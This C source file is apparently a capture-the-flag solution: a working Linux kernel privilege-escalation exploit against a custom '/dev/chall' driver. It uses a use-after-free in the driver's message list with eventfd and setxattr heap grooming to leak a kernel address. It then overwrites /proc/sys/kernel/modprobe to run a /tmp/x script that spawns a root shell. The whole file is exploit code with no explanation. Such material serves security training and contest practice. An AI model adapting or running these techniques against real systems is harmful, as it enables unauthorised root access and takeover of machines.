#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/signal.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <errno.h>

#define ADD_MSG 0x100001
#define GET_MSG 0x100002

struct msg_user {
    size_t len;
    void * data;
    uint64_t key;
};

struct msg_user msg;

uint64_t add_msg(int fd, void * data, size_t len) {
    msg.data = data;
    msg.len = len;
    uint64_t res = ioctl(fd, ADD_MSG, &msg);
    if(res != 0)
        puts("ioctl(fd, ADD_MSG, &msg): Failed");
    return msg.key;
}

void get_msg(int fd, void * data, size_t len, uint64_t key) {
    msg.data = data;
    msg.len = len;
    msg.key = key;
    int64_t res = ioctl(fd, GET_MSG, &msg); 
    if (res != msg.len)
        printf("ioctl(fd, GET_MSG, &msg) : %lld, expected: %lld\n", res, msg.len);
    fflush(stdout);
}

uint64_t get_eventfd_count(int efd) {
    char buf[0x100];
    char file_name[0x100];
    sprintf(file_name, "/proc/self/fdinfo/%d", efd);

    int efdi = open(file_name, 0);
    uint64_t len = read(efdi, buf, 0x100);
    if (len < 0) {
        puts("Failed to get eventfd count");
        exit(1);
    }

    close(efdi);

    uint64_t count = 0;
    if (sscanf(strstr(buf, "eventfd-count:") + 15, "%llx", &count) != 1) {
        puts("Failed to get eventfd count");
        exit(1);
    }

    return count;
}

void modprobe_hax()
{
        system("echo '#!/bin/sh' > /tmp/x; echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
        system("chmod +x /tmp/x");
        int ff = open("/tmp/asd", O_WRONLY|O_CREAT);
        write(ff, "\xff\xff\xff\xff", 4);
        close(ff);
        system("chmod 777 /tmp/asd; /tmp/asd");
        system("sh");
}

int main(void) {
    int fd = open("/dev/chall", 0);
    if(fd < 0)
        return puts("Error opening device");

    unsigned char * ptr = malloc(0x40);
    uint64_t * buf = malloc(0x58);
    memset(ptr, 0, 0x40);
    memset(buf, 'L', 0x58);

    // (list_head = chall_t)
    uint64_t msg1 = add_msg(fd, ptr, 0x8); // list_head -> msg1 -> list_head
    uint64_t msg2 = add_msg(fd, ptr, 0x8); // list_head -> msg1 -> msg2 -> list_head
    uint64_t msg3 = add_msg(fd, ptr, 0x8); // list_head -> msg1 -> msg2 -> msg3 -> list_head
    get_msg(fd, 0xdeadbeef, 1, msg2); // list_head -> msg1 -> msg2 (free) -> ??
    int efd = eventfd(0, 0); // list_head -> msg1 -> eventfd (don't close)
    if(efd < 0)
        perror("eventfd");

    get_msg(fd, ptr, 1, msg3); // list_head -> msg1 -> eventfd -> list_head
    get_msg(fd, ptr, 1, msg1); // list_head -> eventfd -> list_head (fix prev for eventfd)

    uint64_t list_head = get_eventfd_count(efd);
    printf("list_head: %p\n", list_head);
    close(fd);

    fd = open("/dev/chall", 0); // realloc chall_t
    if(fd < 0)
        return puts("Error opening device");

    msg1 = add_msg(fd, ptr, 0x28); // list_head -> msg1 -> list_head
    msg2 = add_msg(fd, ptr, 0x28); // list_head -> msg1 -> msg2 -> list_head

    int off = 0;
    while(!(list_head >> (32 - off*8) & 2)) ++off;
    buf[4] = (list_head & ~0xffffffLL) + 0x623c8 + 8 + off;

    get_msg(fd, 0xdeadbeef, 1, msg1); // list_head -> msg1 (free) -> ??
    setxattr("/tmp", "hax", buf, 0x60); 
    get_msg(fd, ptr, 1, msg2); // list_head -> msg1 -> list_head (msg1->prev = buf[4])
    close(fd);

    fd = open("/proc/sys/kernel/modprobe", O_WRONLY);
    if(fd < 0) {
        perror("open");
        exit(1);
    }

    write(fd, "/tmp/x", 6);
    modprobe_hax();
}
